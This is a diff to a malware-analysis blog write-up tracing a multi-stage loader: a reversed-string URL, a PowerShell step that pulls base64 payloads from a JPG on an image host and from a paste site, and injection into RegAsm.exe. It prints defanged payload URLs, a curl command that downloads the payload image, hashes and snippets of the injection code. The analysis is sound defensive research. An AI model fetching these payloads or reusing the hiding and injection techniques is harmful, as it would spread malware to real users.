@@ -28,7 +28,7 @@ var zFRcqeVmscmYglMSIKZAFqrssqIFeUgbGdouShnFfqpDAimEMJkAyPxIcPDUpQQAMmYIVtUFfORi
 })();
 ```
 
-Besides the very long annoying variable names, this initial script is quite simple, it takes the string "56wui/d/ee.etsap//:sptth", reverses it, and executes the contents of that URL.
+Besides the very long annoying variable names, this initial script is quite simple, it takes the string `56wui/d/ee.etsap//:sptth`, reverses it, and executes the contents of that URL.
 
 Now we know where the second stage is hosted, we'll head over and download the contents to investigate further.
 
@@ -84,16 +84,16 @@ $imageUrl = 'hxxps[://]uploaddeimagens.com[.]br/images/004/691/257/original/js.j
 
 There are 2 interesting URLs within this command block:
 
-[-] hxxps[://]uploaddeimagens.com[.]br/images/004/691/257/original/js.jpg?1702591609
+[-] `hxxps[://]uploaddeimagens.com[.]br/images/004/691/257/original/js.jpg?1702591609`
 
-[-] hxxps[://]paste[.]ee/d/U57Ki/0
+[-] `hxxps[://]paste[.]ee/d/U57Ki/0`
 
 For the first URL, it reads the bytes between 2 flags present in the strings of an image file and executes them. The 2nd URL is passed as an argument - which will make more sense later.
 
-We can extract the contents of the first by downloading the image, running a strings command, and extracting the code between the <<BASE64_START>> and <<BASE64_END>> flags.
+We can extract the contents of the first by downloading the image, running a strings command, and extracting the code between the `<<BASE64_START>>` and `<<BASE64_END>>` flags.
 
 ```
-curl https://uploaddeimagens.com.br/images/004/691/257/original/js.jpg?1702591609 -o test.txt | strings test.txt
+curl https[:]//uploaddeimagens[.]com[.]br/images/004/691/257/original/js.jpg?1702591609 -o test.txt | strings test.txt
 ```
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/87dd46b6-366f-44d2-8768-9c26fae6b070)
 
@@ -103,13 +103,13 @@ When decoding this from Base64 we are given an executable file.
 
 The second URL contains a reversed Base64 string which contains another executable.
 
-**1st Executable SHA 256**: e7e22e5e0f47fe2c2aa71f293e609c4fac901823dce6c6ae39400d1c2f02df54
+**1st Executable SHA 256**: `e7e22e5e0f47fe2c2aa71f293e609c4fac901823dce6c6ae39400d1c2f02df54`
 
-**2nd Executable SHA 256**: 8c21274f725299022fbf415925210da65702198913c4713dfe5dda09ceb2d38a
+**2nd Executable SHA 256**: `8c21274f725299022fbf415925210da65702198913c4713dfe5dda09ceb2d38a`
 
 The first executable appears to be a generic loader / malware deployment framework.
 
-Within the first line after the entry point, we can see the variable 'LAbWJK' which is the name given to the 2nd executable, as it was given as an argument in the previous PowerShell command.
+Within the first line after the entry point, we can see the variable `LAbWJK` which is the name given to the 2nd executable, as it was given as an argument in the previous PowerShell command.
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/74401b9a-3d72-4a46-8ecc-ccf43619ed47)
 
@@ -135,7 +135,7 @@ private static readonly Class1.Delegate1 delegate1_0 = Class1.smethod_0<Class1.D
 private static readonly Class1.Delegate0 delegate0_0 = Class1.smethod_0<Class1.Delegate0>("kern!".Replace("!", "el32"), "@Thread".Replace("@", "Resume"));
 ```
 
-Following this, we can see that 'LAbWJK' - our 2nd executable - is being injected into RegAsm.exe
+Following this, we can see that `LAbWJK` - our 2nd executable - is being injected into `RegAsm.exe`.
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/11a435b8-b82e-4d19-b4a0-7f91dcea8088)
 
